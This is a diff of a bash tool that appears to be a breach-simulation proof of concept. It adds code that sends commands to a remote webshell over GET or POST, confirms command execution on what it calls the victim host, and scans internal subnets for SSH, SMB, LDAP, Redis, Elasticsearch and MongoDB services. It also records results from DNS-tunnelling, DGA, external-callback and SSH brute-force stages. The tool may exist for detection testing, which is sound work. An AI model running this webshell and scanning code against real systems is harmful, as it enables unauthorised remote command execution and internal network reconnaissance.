+                "OVERLAP_FAIL_REASON" "${reason}"
+            ;;
+    esac
+    state_append "stage_results.log" "overlap_timeout label=${label} reason=${reason} file=${basename}"
+}
+
+apply_overlap_env_key() {
+    local key="$1" val="$2"
+    case "${key}" in
+        DNS_TUNNEL_STAGE_STATUS)
+            overlap_enum_allowed "${val}" success failed degraded skipped && DNS_TUNNEL_STAGE_STATUS="${val}"
+            ;;
+        DNS_QUERIES_PLANNED) DNS_QUERIES_PLANNED=$(safe_int "${val}") ;;
+        DNS_QUERIES_ATTEMPTED) DNS_QUERIES_ATTEMPTED=$(safe_int "${val}") ;;
+        DNS_TUNNEL_UNIQUE_QUERIES) DNS_TUNNEL_UNIQUE_QUERIES=$(safe_int "${val}") ;;
+        DNS_TUNNEL_NXDOMAIN_COUNT) DNS_TUNNEL_NXDOMAIN_COUNT=$(safe_int "${val}") ;;
+        DNS_TUNNEL_RESOLVED_COUNT) DNS_TUNNEL_RESOLVED_COUNT=$(safe_int "${val}") ;;
+        DNS_TUNNEL_TIMEOUT_COUNT) DNS_TUNNEL_TIMEOUT_COUNT=$(safe_int "${val}") ;;
+        DNS_TUNNEL_ERROR_COUNT) DNS_TUNNEL_ERROR_COUNT=$(safe_int "${val}") ;;
+        DNS_TUNNEL_ENH_ATTEMPTED) DNS_TUNNEL_ENH_ATTEMPTED=$(safe_int "${val}") ;;
+        DNS_TUNNEL_FB_ATTEMPTED) DNS_TUNNEL_FB_ATTEMPTED=$(safe_int "${val}") ;;
+        DNS_RESPONSES_RECEIVED) DNS_RESPONSES_RECEIVED=$(safe_int "${val}") ;;
+        DNS_EFFECTIVE_TLD_COUNT) DNS_EFFECTIVE_TLD_COUNT=$(safe_int "${val}") ;;
+        DNS_CLUSTER_LOCAL_COUNT) DNS_CLUSTER_LOCAL_COUNT=$(safe_int "${val}") ;;
+        DNS_POWERAPPS_STYLE_COUNT) DNS_POWERAPPS_STYLE_COUNT=$(safe_int "${val}") ;;
+        DNS_SUSPICIOUS_TLD_COUNT) DNS_SUSPICIOUS_TLD_COUNT=$(safe_int "${val}") ;;
+        DNS_HTTPS_QUERY_COUNT) DNS_HTTPS_QUERY_COUNT=$(safe_int "${val}") ;;
+        DNS_TOTAL_ENTROPY_STYLE_COUNT) DNS_TOTAL_ENTROPY_STYLE_COUNT=$(safe_int "${val}") ;;
+        DGA_STAGE_STATUS)
+            overlap_enum_allowed "${val}" success failed partial skipped Success Partial Skipped Failed && DGA_STAGE_STATUS="${val}"
+            ;;
+        DGA_TOTAL_QUERIES) DGA_TOTAL_QUERIES=$(safe_int "${val}") ;;
+        DGA_NXDOMAIN_COUNT) DGA_NXDOMAIN_COUNT=$(safe_int "${val}") ;;
+        DGA_RESOLVED_COUNT) DGA_RESOLVED_COUNT=$(safe_int "${val}") ;;
+        DGA_TIMEOUT_COUNT) DGA_TIMEOUT_COUNT=$(safe_int "${val}") ;;
+        DGA_ERROR_COUNT) DGA_ERROR_COUNT=$(safe_int "${val}") ;;
+        DGA_DETECTION_LIKELIHOOD) DGA_DETECTION_LIKELIHOOD="${val^^}" ;;
+        DGA_DETECTION_REASON) DGA_DETECTION_REASON="${val}" ;;
+        DGA_FINAL_RESULT) DGA_FINAL_RESULT="${val}" ;;
+        DGA_DNS_SERVER) DGA_DNS_SERVER="${val}" ;;
+        DGA_QUERIES_ATTEMPTED) DGA_QUERIES_ATTEMPTED=$(safe_int "${val}") ;;
+        DGA_QUERIES_SENT) DGA_QUERIES_SENT=$(safe_int "${val}") ;;
+        INTERNAL_FANOUT_STATUS)
+            overlap_enum_allowed "${val}" success failed skipped partial degraded && INTERNAL_FANOUT_STATUS="${val}"
+            ;;
+        INTERNAL_FANOUT_TARGETS) INTERNAL_FANOUT_TARGETS=$(safe_int "${val}") ;;
+        INTERNAL_FANOUT_ATTEMPTED) INTERNAL_FANOUT_ATTEMPTED=$(safe_int "${val}") ;;
+        INTERNAL_FANOUT_CONNECTED) INTERNAL_FANOUT_CONNECTED=$(safe_int "${val}") ;;
+        INTERNAL_FANOUT_RESPONSES) INTERNAL_FANOUT_RESPONSES=$(safe_int "${val}") ;;
+        FANOUT_UA_JNDI_STYLE_COUNT) FANOUT_UA_JNDI_STYLE_COUNT=$(safe_int "${val}") ;;
+        FANOUT_UA_OGNL_STYLE_COUNT) FANOUT_UA_OGNL_STYLE_COUNT=$(safe_int "${val}") ;;
+        FANOUT_UA_SPRING_STYLE_COUNT) FANOUT_UA_SPRING_STYLE_COUNT=$(safe_int "${val}") ;;
+        EXTERNAL_CALLBACK_STATUS)
+            overlap_enum_allowed "${val}" success failed skipped partial && EXTERNAL_CALLBACK_STATUS="${val}"
+            ;;
+        EXTERNAL_CALLBACK_ATTEMPTED) EXTERNAL_CALLBACK_ATTEMPTED=$(safe_int "${val}") ;;
+        EXTERNAL_CALLBACK_CONNECTED) EXTERNAL_CALLBACK_CONNECTED=$(safe_int "${val}") ;;
+        EXTERNAL_CALLBACK_RESPONSES) EXTERNAL_CALLBACK_RESPONSES=$(safe_int "${val}") ;;
+        CORRELATION_BEACON_CYCLES) CORRELATION_BEACON_CYCLES=$(safe_int "${val}") ;;
+        HTTP_URL_SCAN_STAGE_STATUS)
+            overlap_enum_allowed "${val}" success failed skipped warn partial degraded && HTTP_URL_SCAN_STAGE_STATUS="${val}"
+            ;;
+        HTTP_SCAN_TARGET_COUNT) HTTP_SCAN_TARGET_COUNT=$(safe_int "${val}") ;;
+        HTTP_REQUESTS_PLANNED) HTTP_REQUESTS_PLANNED=$(safe_int "${val}") ;;
+        HTTP_REQUESTS_ATTEMPTED) HTTP_REQUESTS_ATTEMPTED=$(safe_int "${val}") ;;
+        HTTP_CONNECTED) HTTP_CONNECTED=$(safe_int "${val}") ;;
+        HTTP_RESPONSES_RECEIVED) HTTP_RESPONSES_RECEIVED=$(safe_int "${val}") ;;
+        HTTPS_REQUESTS_ATTEMPTED) HTTPS_REQUESTS_ATTEMPTED=$(safe_int "${val}") ;;
+        HTTPS_CONNECTED) HTTPS_CONNECTED=$(safe_int "${val}") ;;
+        HTTPS_RESPONSES_RECEIVED) HTTPS_RESPONSES_RECEIVED=$(safe_int "${val}") ;;
+        WEB_RESPONSES_RECEIVED) WEB_RESPONSES_RECEIVED=$(safe_int "${val}") ;;
+        HTTP_SCAN_FAILED_RESPONSES) HTTP_SCAN_FAILED_RESPONSES=$(safe_int "${val}") ;;
+        HTTP_SCAN_SUCCESS_RESPONSES) HTTP_SCAN_SUCCESS_RESPONSES=$(safe_int "${val}") ;;
+        HTTPS_SCAN_FAILED_RESPONSES) HTTPS_SCAN_FAILED_RESPONSES=$(safe_int "${val}") ;;
+        HTTPS_SCAN_SUCCESS_RESPONSES) HTTPS_SCAN_SUCCESS_RESPONSES=$(safe_int "${val}") ;;
+        WEB_FAILED_RESPONSES) WEB_FAILED_RESPONSES=$(safe_int "${val}") ;;
+        WEB_SUCCESS_RESPONSES) WEB_SUCCESS_RESPONSES=$(safe_int "${val}") ;;
+        HTTP_200_COUNT) HTTP_200_COUNT=$(safe_int "${val}") ;;
+        HTTP_301_COUNT) HTTP_301_COUNT=$(safe_int "${val}") ;;
+        HTTP_302_COUNT) HTTP_302_COUNT=$(safe_int "${val}") ;;
+        HTTP_401_COUNT) HTTP_401_COUNT=$(safe_int "${val}") ;;
+        HTTP_403_COUNT) HTTP_403_COUNT=$(safe_int "${val}") ;;
+        HTTP_404_COUNT) HTTP_404_COUNT=$(safe_int "${val}") ;;
+        HTTP_405_COUNT) HTTP_405_COUNT=$(safe_int "${val}") ;;
+        HTTPS_200_COUNT) HTTPS_200_COUNT=$(safe_int "${val}") ;;
+        HTTPS_301_COUNT) HTTPS_301_COUNT=$(safe_int "${val}") ;;
+        HTTPS_302_COUNT) HTTPS_302_COUNT=$(safe_int "${val}") ;;
+        HTTPS_401_COUNT) HTTPS_401_COUNT=$(safe_int "${val}") ;;
+        HTTPS_403_COUNT) HTTPS_403_COUNT=$(safe_int "${val}") ;;
+        HTTPS_404_COUNT) HTTPS_404_COUNT=$(safe_int "${val}") ;;
+        HTTPS_405_COUNT) HTTPS_405_COUNT=$(safe_int "${val}") ;;
+        HTTP_PROPFIND_COUNT) HTTP_PROPFIND_COUNT=$(safe_int "${val}") ;;
+        HTTP_OPTIONS_COUNT) HTTP_OPTIONS_COUNT=$(safe_int "${val}") ;;
+        HTTP_POST_COUNT) HTTP_POST_COUNT=$(safe_int "${val}") ;;
+        ABNORMAL_USER_AGENT_COUNT) ABNORMAL_USER_AGENT_COUNT=$(safe_int "${val}") ;;
+        RARE_USER_AGENT_COUNT) RARE_USER_AGENT_COUNT=$(safe_int "${val}") ;;
+        NORMAL_USER_AGENT_COUNT) NORMAL_USER_AGENT_COUNT=$(safe_int "${val}") ;;
+        PAYLOAD_USER_AGENT_COUNT) PAYLOAD_USER_AGENT_COUNT=$(safe_int "${val}") ;;
+        UA_SQLI_STYLE_COUNT) UA_SQLI_STYLE_COUNT=$(safe_int "${val}") ;;
+        UA_ENCODING_ABUSE_COUNT) UA_ENCODING_ABUSE_COUNT=$(safe_int "${val}") ;;
+        UA_COMMAND_STYLE_COUNT) UA_COMMAND_STYLE_COUNT=$(safe_int "${val}") ;;
+        UA_TRAVERSAL_STYLE_COUNT) UA_TRAVERSAL_STYLE_COUNT=$(safe_int "${val}") ;;
+        UA_JNDI_STYLE_COUNT) UA_JNDI_STYLE_COUNT=$(safe_int "${val}") ;;
+        UA_OGNL_STYLE_COUNT) UA_OGNL_STYLE_COUNT=$(safe_int "${val}") ;;
+        UA_SPRING_STYLE_COUNT) UA_SPRING_STYLE_COUNT=$(safe_int "${val}") ;;
+        URL_SCAN_DEGRADED_FALLBACK)
+            [[ "${val}" == true || "${val}" == false ]] && URL_SCAN_DEGRADED_FALLBACK="${val}"
+            ;;
+        WEB_DETECTION_CONFIDENCE)
+            overlap_enum_allowed "${val}" Low Medium High && WEB_DETECTION_CONFIDENCE="${val}"
+            ;;
+        WEB_FAIL_RATIO) WEB_FAIL_RATIO=$(safe_int "${val}") ;;
+        HTTP_SCAN_FAIL_RATIO) HTTP_SCAN_FAIL_RATIO=$(safe_int "${val}") ;;
+        URL_SCAN_UNIQUE_ATTEMPTED) URL_SCAN_UNIQUE_ATTEMPTED=$(safe_int "${val}") ;;
+        URL_SCAN_UNIQUE_FAILED) URL_SCAN_UNIQUE_FAILED=$(safe_int "${val}") ;;
+        URL_SCAN_UNIQUE_SUCCESS) URL_SCAN_UNIQUE_SUCCESS=$(safe_int "${val}") ;;
+        URL_SCAN_UNIQUE_FAIL_RATIO) URL_SCAN_UNIQUE_FAIL_RATIO=$(safe_int "${val}") ;;
+        URL_SCAN_ANOMALY_SCORE) URL_SCAN_ANOMALY_SCORE=$(safe_int "${val}") ;;
+        HTTP_SCAN_UNIQUE_URL_TARGET) HTTP_SCAN_UNIQUE_URL_TARGET=$(safe_int "${val}") ;;
+        FOLLOWUP_HTTP_REQUESTS) FOLLOWUP_HTTP_REQUESTS=$(safe_int "${val}") ;;
+        FOLLOWUP_SSH_AUTH_FAILURES) FOLLOWUP_SSH_AUTH_FAILURES=$(safe_int "${val}") ;;
+        SSH_ATTEMPTS_PLANNED) SSH_ATTEMPTS_PLANNED=$(safe_int "${val}") ;;
+        SSH_ATTEMPTS_EXECUTED) SSH_ATTEMPTS_EXECUTED=$(safe_int "${val}") ;;
+        SSH_AUTH_ATTEMPTED) SSH_AUTH_ATTEMPTED=$(safe_int "${val}") ;;
+        SSH_AUTH_FAILURES_OBSERVED) SSH_AUTH_FAILURES_OBSERVED=$(safe_int "${val}") ;;
+        NONSTANDARD_PORT_CONNECTIONS) NONSTANDARD_PORT_CONNECTIONS=$(safe_int "${val}") ;;
+        DEGRADED_TELEMETRY)
+            [[ "${val}" == true || "${val}" == false ]] && DEGRADED_TELEMETRY="${val}"
+            ;;
+        OVERLAP_FAIL_REASON) : ;;
+        *) return 1 ;;
+    esac
+    return 0
+}
+
+parse_overlap_env_file() {
+    local path="$1" line key val
+    [[ -f "${path}" ]] || return 0
+    while IFS= read -r line || [[ -n "${line}" ]]; do
+        [[ -z "${line}" || "${line}" == \#* ]] && continue
+        [[ "${line}" =~ ^([A-Z][A-Z0-9_]*)=(.*)$ ]] || continue
+        key="${BASH_REMATCH[1]}"
+        val="${BASH_REMATCH[2]}"
+        apply_overlap_env_key "${key}" "${val}" || true
+    done < "${path}"
+}
+
+load_overlap_stage_results_from_state() {
+  [[ -n "${LOCAL_STATE_DIR}" && -d "${LOCAL_STATE_DIR}" ]] || return 0
+  local f
+  for f in dns_tunnel_result.env dga_simulation_result.env internal_fanout_result.env \
+           external_callback_result.env http_url_scan_result.env ssh_auth_burst_result.env nonstandard_port_result.env; do
+    parse_overlap_env_file "${LOCAL_STATE_DIR}/${f}"
+  done
+  if [[ -f "${LOCAL_STATE_DIR}/overlap_executed.flag" ]] && [[ "$(< "${LOCAL_STATE_DIR}/overlap_executed.flag" 2>/dev/null || echo false)" == true ]]; then
+    OVERLAP_EXECUTED=true
+  fi
+}
+
+append_degraded_stage_summary() {
+  [[ -n "${LOCAL_STATE_DIR}" && -f "${LOCAL_STATE_DIR}/stage_results.log" ]] || return 0
+  if ! grep -Eq ': Failed|: Partial' "${LOCAL_STATE_DIR}/stage_results.log" 2>/dev/null; then
+    return 0
+  fi
+  echo "Degraded / failed stages:"
+  grep -E ': Failed|: Partial' "${LOCAL_STATE_DIR}/stage_results.log" 2>/dev/null | sed 's/^/  - /' || true
+  echo ""
 }
 
 refresh_remote_paths() {
@@ -622,10 +1102,8 @@ Local Operator Paths:
 - EFFECTIVE_REPORT_DIR : ${EFFECTIVE_REPORT_DIR}
 - LOCAL_STATE_DIR      : ${LOCAL_STATE_DIR}
 - LOG_DIR              : ${LOG_DIR}
+- LOG_FILE             : ${LOG_FILE}
 - REPORT_MD            : ${REPORT_MD}
-- SUMMARY_TXT          : ${SUMMARY_TXT}
-- CUSTOMER_SUMMARY_TXT : ${CUSTOMER_SUMMARY_TXT}
-- TIMELINE_LOG         : ${TIMELINE_LOG}
 
 Remote Webshell Paths:
 - REMOTE_RUNTIME_DIR   : ${REMOTE_RUNTIME_DIR}
@@ -803,7 +1281,7 @@ check_webshell_payload_size() {
         return 1
     fi
     if (( bytes > PAYLOAD_WARN_BYTES )); then
-        log_message "WARN" "Large webshell payload (${bytes} bytes) at context=${context}; may exceed URL/servlet/proxy limits. Prefer --webshell-method POST if using GET."
+        log_message "WARN" "Large webshell payload (${bytes} bytes) at context=${context}; may exceed URL/servlet/proxy limits (auto mode switches to POST when supported)."
     fi
     return 0
 }
@@ -1055,10 +1533,15 @@ normalize_stage_status() {
 }
 
 set_stage_result() {
-    local stage="$1" status reason
+    local stage="$1" status reason ts
     status=$(normalize_stage_status "$2")
     reason="${3:-}"
     state_append "stage_results.log" "${stage}: ${status}${reason:+ | Reason: ${reason}}"
+    log_message "INFO" "Stage result: ${stage} = ${status}${reason:+ — ${reason}}"
+    if declare -F poc_obs_report_stage_event >/dev/null 2>&1; then
+        ts=$(date +"%Y-%m-%d %H:%M:%S")
+        poc_obs_report_stage_event "${ts}" "${stage}" "—" "stage_result" "—" "${status}" "${reason:-—}"
+    fi
 }
 
 b64_encode_no_wrap() {
@@ -1167,17 +1650,47 @@ select_remote_shell_bin() {
     fi
 }
 
+# Remote webshell payloads with WEBSHELL_CMD_STYLE=raw are often executed by /bin/sh.
+# Wrap bash-only generated scripts so mapfile/[[/local work on the victim host.
+remote_bash_script_open() {
+    local delim="${1:-REMOTE_BASH_SCRIPT}"
+    if [[ "${HAS_bash:-false}" == true ]]; then
+        printf "bash <<'%s'\n" "${delim}"
+    fi
+}
+
+remote_bash_script_close() {
+    local delim="${1:-REMOTE_BASH_SCRIPT}"
+    if [[ "${HAS_bash:-false}" == true ]]; then
+        printf '%s\n' "${delim}"
+    fi
+}
+
 wrap_remote_payload() {
     local payload="$1"
+    local mode="${2:-normal}"
+    local remote_timeout=15
+    local exit_suffix='; _poc_ec=$?; echo __EXIT_CODE:${_poc_ec}'
     # Typical JSP/PHP webshells already invoke /bin/sh -c on cmd — send raw script.
     if [[ "${WEBSHELL_CMD_STYLE}" == "raw" ]]; then
-        printf '%s' "${payload}"
+        # Heredoc terminators must be alone on their line; command substitution strips
+        # trailing newlines from generated payloads, so keep a newline before the suffix.
+        if [[ "${payload}" == *"<<"* ]]; then
+            printf '%s\n_poc_ec=$?\necho __EXIT_CODE:${_poc_ec}\n' "${payload}"
+        else
+            printf '%s%s' "${payload}" "${exit_suffix}"
+        fi
         return 0
     fi
+    case "${mode}" in
+        long) remote_timeout="${WEBSHELL_LONG_TIMEOUT:-300}" ;;
+        quick) remote_timeout=10 ;;
+        bootstrap) remote_timeout=15 ;;
+    esac
     if [[ "${REMOTE_WRAP_READY}" == true && "${HAS_timeout:-false}" == true ]]; then
-        printf 'timeout 15 %q -c %q 2>&1 || true' "${REMOTE_SHELL_BIN}" "${payload}"
+        printf 'timeout %s %q -c %q; _poc_ec=$?; echo __EXIT_CODE:${_poc_ec}' "${remote_timeout}" "${REMOTE_SHELL_BIN}" "${payload}"
     else
-        printf '%q -c %q 2>&1 || true' "${REMOTE_SHELL_BIN}" "${payload}"
+        printf '%q -c %q; _poc_ec=$?; echo __EXIT_CODE:${_poc_ec}' "${REMOTE_SHELL_BIN}" "${payload}"
     fi
 }
 
@@ -1186,11 +1699,11 @@ normalize_webshell_response() {
     printf '%s' "${raw}" | tr -d '\r' | sed -e 's/<[^>][^>]*>//g' -e 's/&nbsp;/ /g' -e 's/&lt;/</g' -e 's/&gt;/>/g' -e 's/&amp;/\&/g'
 }
 
-webshell_curl_transport() {
-    local wrapped="$1" curl_max="${2:-15}"
+webshell_curl_transport_with_method() {
+    local wrapped="$1" curl_max="${2:-15}" transport="${3:-GET}"
     build_curl_common_args "${curl_max}"
     local args=("${CURL_COMMON_ARGS[@]}")
-    if [[ "${WEBSHELL_METHOD}" == "GET" ]]; then
+    if [[ "${transport}" == "GET" ]]; then
         args+=(--get --data-urlencode "cmd=${wrapped}")
     else
         args+=(--data-urlencode "cmd=${wrapped}")
@@ -1203,30 +1716,161 @@ webshell_curl_transport() {
     normalize_webshell_response "${body}"
 }
 
+webshell_curl_transport() {
+    local wrapped="$1" curl_max="${2:-15}"
+    webshell_curl_transport_with_method "${wrapped}" "${curl_max}" "$(webshell_effective_method)"
+}
+
+webshell_capability_probe() {
+    local transport="$1" marker="$2" wrapped body
+    case "${transport}" in
+        GET) wrapped="echo ${marker}" ;;
+        POST) wrapped="echo ${marker}" ;;
+        *) return 1 ;;
+    esac
+    body=$(webshell_curl_transport_with_method "${wrapped}" 12 "${transport}")
+    [[ "${body}" == *"${marker}"* ]]
+}
+
+webshell_log_capability_test() {
+    local transport="$1" result="$2"
+    local msg="WEBSHELL_CAPABILITY_TEST transport=${transport} result=${result}"
+    log_message "OK" "${msg}" >&2
+    state_append "webshell_transport.log" "${msg}"
+}
+
+discover_webshell_transport() {
+    local post_ok=no get_ok=no effective="" reason="" selection_reason=""
+    local post_marker="STELLAR_POC_POST_TEST" get_marker="STELLAR_POC_GET_TEST"
+    WEBSHELL_POST_SUPPORTED=false
+    WEBSHELL_GET_SUPPORTED=false
+
+    if [[ "${WEBSHELL_USER_METHOD}" != auto ]]; then
+        effective="${WEBSHELL_USER_METHOD^^}"
+        WEBSHELL_POST_SUPPORTED=$([[ "${effective}" == POST ]] && printf true || printf false)
+        WEBSHELL_GET_SUPPORTED=$([[ "${effective}" == GET ]] && printf true || printf false)
+        WEBSHELL_EFFECTIVE_METHOD="${effective}"
+        WEBSHELL_METHOD="${effective}"
+        WEBSHELL_TRANSPORT_DISCOVERED=true
+        webshell_log_capability_test "${effective}" "success"
+        log_message "OK" "WEBSHELL_TRANSPORT_DISCOVERY post_result=skipped get_result=skipped effective_method=${effective} selection_reason=user_override" >&2
+        state_append "webshell_transport.log" "WEBSHELL_TRANSPORT_DISCOVERY post_result=skipped get_result=skipped effective_method=${effective} selection_reason=user_override"
+        return 0
+    fi
+
+    if webshell_capability_probe POST "${post_marker}"; then
+        post_ok=yes
+        WEBSHELL_POST_SUPPORTED=true
+        webshell_log_capability_test POST success
+    else
+        webshell_log_capability_test POST failed
+    fi
+
+    if webshell_capability_probe GET "${get_marker}"; then
+        get_ok=yes
+        WEBSHELL_GET_SUPPORTED=true
+        webshell_log_capability_test GET success
+    else
+        webshell_log_capability_test GET failed
+    fi
+
+    if [[ "${post_ok}" == yes && "${get_ok}" == yes ]]; then
+        effective=POST
+        selection_reason=preferred_transport
+    elif [[ "${post_ok}" == yes ]]; then
+        effective=POST
+        selection_reason=only_supported_transport
+    elif [[ "${get_ok}" == yes ]]; then
+        effective=GET
+        selection_reason=only_supported_transport
+    else
+        log_message "ERROR" "WEBSHELL_TRANSPORT_DISCOVERY post_result=failed get_result=failed — preflight failed" >&2
+        state_append "webshell_transport.log" "WEBSHELL_TRANSPORT_DISCOVERY post_result=failed get_result=failed effective_method=none selection_reason=none"
+        return 1
+    fi
+
+    WEBSHELL_EFFECTIVE_METHOD="${effective}"
+    WEBSHELL_METHOD="${effective}"
+    WEBSHELL_TRANSPORT_DISCOVERED=true
+    log_message "OK" "WEBSHELL_TRANSPORT_DISCOVERY post_result=${post_ok} get_result=${get_ok} effective_method=${effective} selection_reason=${selection_reason}" >&2
+    state_append "webshell_transport.log" "WEBSHELL_TRANSPORT_DISCOVERY post_result=${post_ok} get_result=${get_ok} effective_method=${effective} selection_reason=${selection_reason}"
+    return 0
+}
+
+webshell_effective_method() {
+    if [[ "${WEBSHELL_TRANSPORT_DISCOVERED}" != true ]]; then
+        discover_webshell_transport || printf '%s' GET
+        return 0
+    fi
+    printf '%s' "${WEBSHELL_EFFECTIVE_METHOD:-GET}"
+}
+
+webshell_transport_for_payload() {
+    local context="$1" payload_bytes="$2"
+    local base from to
+    payload_bytes=$(safe_int "${payload_bytes}")
+    base=$(webshell_effective_method)
+    from="${base}"
+    to="${base}"
+    if (( payload_bytes > PAYLOAD_FORCE_POST_BYTES )); then
+        if [[ "${WEBSHELL_POST_SUPPORTED}" == true ]]; then
+            to=POST
+            if [[ "${from}" != POST ]]; then
+                log_message "OK" "WEBSHELL_TRANSPORT_SWITCH context=${context} from=${from} to=POST reason=payload_bytes_gt_${PAYLOAD_FORCE_POST_BYTES} payload_bytes=${payload_bytes}" >&2
+                state_append "webshell_transport.log" "WEBSHELL_TRANSPORT_SWITCH context=${context} from=${from} to=POST reason=payload_bytes_gt_${PAYLOAD_FORCE_POST_BYTES} payload_bytes=${payload_bytes}"
+            fi
+        else
+            log_message "WARN" "WEBSHELL_TRANSPORT_LIMITATION context=${context} payload_bytes=${payload_bytes} transport=GET risk=url_length_limit" >&2
+            state_append "webshell_transport.log" "WEBSHELL_TRANSPORT_LIMITATION context=${context} payload_bytes=${payload_bytes} transport=GET risk=url_length_limit"
+        fi
+    fi
+    printf '%s' "${to}"
+}
+
+webshell_save_active_transport() {
+    printf '%s' "${WEBSHELL_METHOD:-$(webshell_effective_method)}"
+}
+
+webshell_restore_active_transport() {
+    WEBSHELL_METHOD="$1"
+}
+
+webshell_apply_payload_transport() {
+    local context="$1" payload_bytes="$2"
+    WEBSHELL_METHOD=$(webshell_transport_for_payload "${context}" "${payload_bytes}")
+}
+
 detect_webshell_command_style() {
-    local token="$1" style wrapped body http_code preview saved_method
+    local token="$1" style wrapped body http_code preview transport
     token="${token:-STELLAR_POC_PROBE_${RANDOM}}"
-    saved_method="${WEBSHELL_METHOD}"
+    transport=$(webshell_effective_method)
     for style in raw wrapped_sh wrapped_bash; do
         case "${style}" in
             raw) wrapped="echo ${token}" ;;
             wrapped_sh) wrapped=$(printf 'sh -c %q 2>&1 || true' "echo ${token}") ;;
             wrapped_bash) wrapped=$(printf 'bash -c %q 2>&1 || true' "echo ${token}") ;;
         esac
-        for WEBSHELL_METHOD in GET POST; do
-            body=$(webshell_curl_transport "${wrapped}" 12)
+        body=$(webshell_curl_transport_with_method "${wrapped}" 12 "${transport}")
+        http_code="${WEBSHELL_LAST_HTTP_CODE}"
+        if [[ "${body}" == *"${token}"* ]]; then
+            WEBSHELL_CMD_STYLE="${style}"
+            add_preflight_result "[+] Command execution confirmed (style=${style} method=${transport} effective=${WEBSHELL_EFFECTIVE_METHOD})"
+            vlog "Webshell cmd style=${style} method=${transport} http=${http_code}"
+            return 0
+        fi
+        vlog "Probe style=${style} method=${transport} http=${http_code} body=$(printf '%.120s' "${body}")"
+        if [[ "${WEBSHELL_POST_SUPPORTED}" == true && "${WEBSHELL_GET_SUPPORTED}" == true && "${transport}" == POST ]]; then
+            body=$(webshell_curl_transport_with_method "${wrapped}" 12 GET)
             http_code="${WEBSHELL_LAST_HTTP_CODE}"
             if [[ "${body}" == *"${token}"* ]]; then
                 WEBSHELL_CMD_STYLE="${style}"
-                add_preflight_result "[+] Command execution confirmed (style=${style} method=${WEBSHELL_METHOD})"
-                vlog "Webshell cmd style=${style} method=${WEBSHELL_METHOD} http=${http_code}"
+                add_preflight_result "[+] Command execution confirmed (style=${style} method=GET fallback)"
+                vlog "Webshell cmd style=${style} method=GET fallback http=${http_code}"
                 return 0
             fi
-            vlog "Probe style=${style} method=${WEBSHELL_METHOD} http=${http_code} body=$(printf '%.120s' "${body}")"
-        done
+        fi
     done
-    WEBSHELL_METHOD="${saved_method}"
-    body=$(webshell_curl_transport "echo ${token}" 12)
+    body=$(webshell_curl_transport_with_method "echo ${token}" 12 "${transport}")
     preview=$(printf '%.160s' "${body}" | tr '\n' ' ')
     add_preflight_result "[-] Command execution failed (HTTP ${WEBSHELL_LAST_HTTP_CODE:-000} preview=${preview})"
     log_message "ERROR" "Command execution validation failed (HTTP ${WEBSHELL_LAST_HTTP_CODE:-000}) — try --verbose or --webshell-method POST"
@@ -1281,27 +1925,33 @@ EOF
 }
 
 build_remote_service_discovery_fallback() {
-    local xargs_block sequential_block
+    local web_specs port_specs xargs_block sequential_block
+    if fast_safe_mode_enabled; then
+        port_specs=$(fast_safe_discovery_all_specs_inline)
+    else
+        web_specs=$(http_discovery_remote_port_specs 2>/dev/null || printf '%s' "80:http_targets.txt 443:https_targets.txt 8080:http_targets.txt 8443:https_targets.txt ")
+        port_specs="22:ssh_hosts.txt 53:dns_hosts.txt ${web_specs}445:smb_hosts.txt 389:ldap_hosts.txt 6379:redis_hosts.txt 9200:elastic_hosts.txt 27017:mongo_hosts.txt"
+    fi
     if [[ "${REMOTE_XARGS_PARALLEL_SUPPORTED}" == true ]]; then
         xargs_block="seq_list 254 | xargs -I{} -P ${FALLBACK_SCAN_PARALLELISM} sh -c '
 h=\"\${NP}.\$1\"
-hosttag=\"\$(echo \"\${h}\" | tr . _)\"
-for spec in 22:ssh_hosts.txt 53:dns_hosts.txt 80:http_targets.txt 443:https_targets.txt 445:smb_hosts.txt 389:ldap_hosts.txt 8080:http_targets.txt 8443:https_targets.txt 6379:redis_hosts.txt 9200:elastic_hosts.txt 27017:mongo_hosts.txt; do
+hosttag=\"\$(echo \"\${h}\" | tr . _)\" 
+for spec in ${port_specs}; do
   port=\"\${spec%%:*}\"
   file=\"\${spec#*:}\"
   outfile=\"\${SCAN_DIR}/\${file}.\${hosttag}\"
-  poc_port_probe \"\${h}\" \"\${port}\" && echo \"\${h}\" >> \"\${outfile}\"
+  poc_port_probe \"\${h}\" \"\${port}\" && echo \"\${h}:\${port}\" >> \"\${outfile}\"
 done
 ' _ {}"
     else
         sequential_block="for i in \$(seq_list 254); do
   h=\"\${NP}.\${i}\"
-  hosttag=\"\$(echo \"\${h}\" | tr . _)\"
-  for spec in 22:ssh_hosts.txt 53:dns_hosts.txt 80:http_targets.txt 443:https_targets.txt 445:smb_hosts.txt 389:ldap_hosts.txt 8080:http_targets.txt 8443:https_targets.txt 6379:redis_hosts.txt 9200:elastic_hosts.txt 27017:mongo_hosts.txt; do
+  hosttag=\"\$(echo \"\${h}\" | tr . _)\" 
+  for spec in ${port_specs}; do
     port=\"\${spec%%:*}\"
     file=\"\${spec#*:}\"
     outfile=\"\${SCAN_DIR}/\${file}.\${hosttag}\"
-    poc_port_probe \"\${h}\" \"\${port}\" && echo \"\${h}\" >> \"\${outfile}\"
+    poc_port_probe \"\${h}\" \"\${port}\" && echo \"\${h}:\${port}\" >> \"\${outfile}\"
   done
 done"
         xargs_block="${sequential_block}"
@@ -1324,16 +1974,22 @@ EOF
 }
 
 build_remote_service_discovery_chunk() {
-    local start="$1" end="$2" xargs_block
+    local start="$1" end="$2" xargs_block web_specs port_specs
+    if fast_safe_mode_enabled; then
+        port_specs=$(fast_safe_discovery_all_specs_inline)
+    else
+        web_specs=$(http_discovery_remote_port_specs 2>/dev/null || printf '%s' "80:http_targets.txt 443:https_targets.txt 8080:http_targets.txt 8443:https_targets.txt ")
+        port_specs="22:ssh_hosts.txt 53:dns_hosts.txt ${web_specs}445:smb_hosts.txt 389:ldap_hosts.txt 6379:redis_hosts.txt 9200:elastic_hosts.txt 27017:mongo_hosts.txt"
+    fi
     if [[ "${REMOTE_XARGS_PARALLEL_SUPPORTED}" == true ]]; then
         xargs_block="seq_list ${end} | awk -v s=${start} '\$1>=s' | xargs -I{} -P ${FALLBACK_SCAN_PARALLELISM} sh -c '
 h=\"\${NP}.\$1\"
 hosttag=\"\$(echo \"\${h}\" | tr . _)\"
-for spec in 22:ssh_hosts.txt 53:dns_hosts.txt 80:http_targets.txt 443:https_targets.txt 445:smb_hosts.txt 389:ldap_hosts.txt 8080:http_targets.txt 8443:https_targets.txt 6379:redis_hosts.txt 9200:elastic_hosts.txt 27017:mongo_hosts.txt; do
+for spec in ${port_specs}; do
   port=\"\${spec%%:*}\"
   file=\"\${spec#*:}\"
